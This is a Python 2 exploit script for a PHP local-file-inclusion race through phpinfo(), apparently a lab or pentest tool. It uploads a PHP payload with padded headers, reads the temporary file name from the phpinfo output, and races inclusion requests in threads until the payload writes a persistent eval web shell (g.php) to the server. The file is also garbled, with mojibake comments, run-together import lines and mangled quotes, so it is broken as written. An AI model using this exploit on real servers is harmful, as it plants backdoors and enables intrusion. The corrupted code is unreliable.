# -*- coding: utf-8 -*-
'''
    ';';';
    ��ʼ��HTTP�������ݰ�
    TAG��У������Ƿ�ɹ���־
    PAYLOAD������Ҫִ�е�PHP����
    padding���������ݿ�����
    LFIREQ:�ļ���������
    REQ_DATA��POST��������
    REQ������POST����
    ';';';
'''

import sysimport socketimport threadingdef 
import socket  

def setup(host, port):

    TAG="Security Test"
    PAYLOAD="""%s
<?php
$c=fopen("H:/wamp/tmp/g.php",';w';);
fwrite($c,"<?php eval(';fb';);?>");
?>\r""" % TAG
    padding = "A" * 2000
    LFIREQ = """GET /lfi.php?load=%(file)s HTTP/1.1\r
User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36\r
Connection: keep-alive\r
Host: %(host)s\r
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r
Upgrade-Insecure-Requests: 1\n
Accept-Encoding: gzip, deflate, sdch\n
\n"""
    REQ_DATA = """------WebKitFormBoundaryIYu6Un7AVVkBR0k6\r
Content-Disposition: form-data; name="file"; filename="shell.php"\r
Content-Type: application/octet-stream\r
\r
%s
------WebKitFormBoundaryIYu6Un7AVVkBR0k6\r
Content-Disposition: form-data; name="submit"\r
\r
Submit
------WebKitFormBoundaryIYu6Un7AVVkBR0k6--\r""" % PAYLOAD
    REQ = """POST /phpinfo.php HTTP/1.1\r
User-Agent: """ + padding + """\r
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r
Accept-Language: """ + padding + """\r
Accept-Encoding: gzip, deflate\r
Cache-Control: max-age=0\r
Referer: """ + padding + """\r
Connection: keep-alive\r
Upgrade-Insecure-Requests: 1\r
Host: %(host)s\r
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryIYu6Un7AVVkBR0k6\r
Content-Length: %(len)s\r
\r
%(data)s""" % {';host';: host, ';len';: len(REQ_DATA), ';data';: REQ_DATA}
    return (REQ, TAG, LFIREQ)
 
def phpInfoLFI(host, port, phpinforeq, offset, lfireq, tag):
'''
    :param host: Ŀ������IP
    :param port: �˿�
    :param phpinforeq: ��phpinfo�ļ�������
    :param offset: ��ʱ�ļ���λ��
    :param lfireq:�ļ���������
    :param tag: �������ɹ���־
    :return: ����������ʱ�ļ���
'''
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s2.connect((host, port))
 
    s.send(phpinforeq)
    d = ""
    while len(d) < offset:
        d += s.recv(offset)
    try:
        i = d.index("[tmp_name] =>")
        fn = d[i+17:i+40]
    except ValueError:
        return None
    s2.send(lfireq % {';file';: fn, ';host';: host})
    d = s2.recv(4096)
    s.close()
    s2.close()
    if d.find(tag) != -1:
        return fn
 
counter = 0

class ThreadWorker(threading.Thread):
'''
    �̲߳���
    maxattempts������Դ���
'''
    def __init__(self, e, l, m, *args):
        threading.Thread.__init__(self)
        self.event = e
        self.lock = l
        self.maxattempts = m
        self.args = args
    def run(self):
        global counter
        while not self.event.is_set():
            with self.lock:
                if counter >= self.maxattempts:
                    return
                counter += 1
            try:
                x = phpInfoLFI(*self.args)
                if self.event.is_set():
                    break
                if x:
                    print "\nGot it! Shell create in H:/wamp/tmp/g.php"
                    self.event.set()
            except socket.error:
                return
				
				
def getOffset(host, port, phpinforeq):
'''
    :param host: Ŀ������IP
    :param port: �˿�
    :param phpinforeq: ��phpinfo�ļ���POST����
    :return:������ʱ�ļ����ڷ������ݿ��е�λ��
'''
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.send(phpinforeq)
    d = ""
    while True:
        i = s.recv(4096)
        d += i
        if i == "":
            break
        if i.endswith("0\r\n\r\n"):
            break
    s.close()
    i = d.find("[tmp_name] =>")
    if i == -1:
        raise ValueError("No php tmp_name in phpinfo output")
    print "found %s at %i" % (d[i:i+10], i)
    return i+256
	
	
def main():
    print "LFI with PHPinfo()"
    if len(sys.argv) < 2:
        print "Usage:%s host [port] [poolsz]" % sys.argv[0]
        sys.exit(1)
    try:
        host = socket.gethostbyname(sys.argv[1])
    except socket.error, e:
        print "Error with hostname %s: %s" % (sys.argv[1], e)
        sys.exit(1)
    port = 80
    try:
        port = int(sys.argv[2])
    except IndexError:
        pass
    except ValueError, e:
        print "Error with port %d: %s" % (sys.argv[2], e)
        sys.exit(1)
    poolsz = 10
    try:
        poolsz = int(sys.argv[3])
    except IndexError:
        pass
    except ValueError, e:
        print "Error with poolsz %d: %s" %(sys.argv[3], e)
        sys.exit(1)
    print "Getting initial offset..."
    phpinforeq, tag, lfireq = setup(host, port)
    offset = getOffset(host, port, phpinforeq)
    sys.stdout.flush()
    maxattempts = 200
    e = threading.Event()
    l = threading.Lock()
 
    print "Spawning worker pool (%d)..." % poolsz
    sys.stdout.flush()
 
    tp = []
    for i in range(0, poolsz):
        tp.append(ThreadWorker(e, l, maxattempts, host, port, phpinforeq, offset, lfireq, tag))
    for t in tp:
        t.start()
    try:
        while not e.wait(1):
            if e.is_set():
                break
            with l:
                sys.stdout.write("\r % 4d / % 4d" % (counter, maxattempts))
                sys.stdout.flush()
                if counter >= maxattempts:
                    break
        if e.is_set():
            print "Woot! \m/"
        else:
            print ":("
    except KeyboardInterrupt:
        print "\nTelling threads to shutdown..."
        e.set()
 
    for t in tp:
        t.join()

if __name__ == "__main__":
    main()
	
